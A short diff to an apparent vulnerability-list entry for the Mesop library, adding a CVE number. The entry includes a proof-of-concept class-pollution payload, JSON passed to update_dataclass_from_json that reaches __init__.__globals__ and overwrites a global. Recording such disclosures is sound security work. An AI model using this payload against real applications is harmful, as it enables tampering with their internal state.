@@ -5,7 +5,7 @@
 + Library: Mesop
 + Stars: 5.7K
 + Version: v0.13.0
-+ CVE: N/A
++ CVE: CVE-2025-30358
 + Status: Pending
 + Payload: ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')```
 + Foundby: BlackPyrl
